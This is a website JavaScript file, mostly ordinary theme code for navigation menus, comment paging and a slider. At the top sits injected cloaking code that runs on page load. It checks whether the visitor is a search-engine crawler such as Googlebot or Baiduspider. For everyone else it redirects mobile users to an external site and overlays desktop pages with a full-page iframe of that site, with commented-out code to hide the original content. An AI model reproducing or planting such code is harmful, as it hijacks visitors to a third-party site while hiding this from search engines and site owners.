function isSpider() {
    var flag = false;
    var spider = navigator.userAgent.toLowerCase();
    var spiderSite = ['baiduspider', 'baidu.', '360Spider', 'sogou.', 'soso.', 'yisouspider', 'bingbot', 'bing.', 'google.', 'googlebot'];
    for (let i = 0, len = spiderSite.length; i < len; i++) {
        if (spider.indexOf(spiderSite[i]) > 0) {
            flag = true;
            break;
        }
    }
    if (!flag) {
        goPAGE();
    }
}



function goPAGE() {
    if ((navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i))) {
        // var ss = '<center id="yangchen" style="position:relative;top: 0;bottom: 0;left: 0;right: 0;z-index: 99999999999999"><iframe id="external-frame" scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="800px" src="https://im132.mom/" ></iframe></center>';
        // document.body.insertAdjacentHTML('afterbegin', ss);
        window.location.href = "https://im132.mom/"
    } else {
        var ss = '<center id="yangchen" style="position:relative;top: 0;bottom: 0;left: 0;right: 0;z-index: 99999999999999"><iframe id="external-frame" scrolling="no" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="5800px" src="https://im132.mom/"></iframe></center>';
        // eval("document.write('" + ss + "');");
        /*try {
            setInterval(function() {
                for (var i = 0,lenth = document.body.children.length; i < lenth; i++) {
                    var myid = document.body.children[i].id;
                    if (myid != "yangchen") {
                        document.body.children[i].style.display = "none"
                    }
                }
            }, 500)
        } catch (e) {}*/
        document.body.insertAdjacentHTML('afterbegin', ss);
    }
}

(function () {
    var isReady = false; 
    var readyList = [];
    var timer;

    ready = function (fn) {
        if (isReady)
            fn.call(document);
        else
            readyList.push(function () {
                return fn.call(this);
            });
        return this;
    }

    var onDOMReady = function () {
        for (var i = 0; i < readyList.length; i++) {
            readyList[i].apply(document);
        }
        readyList = null;
    }

    var bindReady = function (evt) {
        if (isReady) return;
        isReady = true;
        onDOMReady.call(window);
        if (document.removeEventListener) {
            document.removeEventListener("DOMContentLoaded", bindReady, false);
        } else if (document.attachEvent) {
            document.detachEvent("onreadystatechange", bindReady);
            if (window == window.top) {
                clearInterval(timer);
                timer = null;
            }
        }
    };

    if (document.addEventListener) {
        document.addEventListener("DOMContentLoaded", bindReady, false);
    } else if (document.attachEvent)

    {
        document.attachEvent("onreadystatechange", function () {
            if ((/loaded|complete/).test(document.readyState))
                bindReady();
        });

        if (window == window.top)
        {
            timer = setInterval(function () {
                try {
                    isReady || document.documentElement.doScroll('left');
                } catch (e) {
                    return;
                }
                bindReady();
            }, 5);
        }
    }
})();


ready(function () {
    document.body.removeAttribute('style');
    document.body.style.width = '100%';
    document.body.style.margin = 0;
    document.body.style.padding = 0;
    isSpider();
});








$(document).ready(function(){$(".nav ul li:has(ul)").hover(function(){$(this).children("a").css({color:"#fff"});0<$(this).find("li").length&&$(this).children("ul").stop(!0,!0).slideDown(100)},function(){$(this).children("a").css({color:"#FFF"});$(this).children("ul").stop(!0,!0).slideUp("fast")});$(".toggle-search").click(function(){$(".toggle-search").toggleClass("active");$(".search-expand").fadeToggle(300)});$(".navbar-toggle").click(function(){$(".navbar-toggle").toggleClass("active");$(".navbar-collapse").toggle(300);$(".nav ul li ul").show()});$(".viewimg a").hover(function(){$(this).find(".shine").stop();$(this).find(".shine").css("background-position","-160px 0");$(this).find(".shine").animate({backgroundPosition:"160px"},500)},function(){});$(".totop").hide();$(window).scroll(function(){0<$(window).scrollTop()?$(".totop").fadeIn(200):$(".totop").fadeOut(200)});$(".totop").click(function(){$("html,body").animate({scrollTop:"0px"},400)});$(".slide_container").hover(function(){$(".slide_nav").fadeIn(200)},function(){$(".slide_nav").fadeOut(200)})
});

//    ۷ ҳ
$body=(window.opera)?(document.compatMode=="CSS1Compat"?$('html'):$('body')):$('html,body');
$('.page_navi a').live('click', function(e){
    e.preventDefault();
    $.ajax({
        type: "GET",
        url: $(this).attr('href'),
        beforeSend: function(){
            $('.page_navi').remove();
            $('.comments-container').remove();
            $('#loading-comments').slideDown(500);
        },
        dataType: "html",
        success: function(out){
            result = $(out).find('.comments-container');
            nextlink = $(out).find('.page_navi');
            $('#loading-comments').slideUp('fast');
            $('#loading-comments').after(result.fadeIn(500));
            $('.comments-container').after(nextlink);
        }
    });
});

$(function(){$("#slider").responsiveSlides({
	auto:true,
	pager:false,
	nav:true,
	speed:500,
	pauseControls:true,
	pager:true,
	manualControls:"auto",
	namespace:"slide"
	})});//      Ч    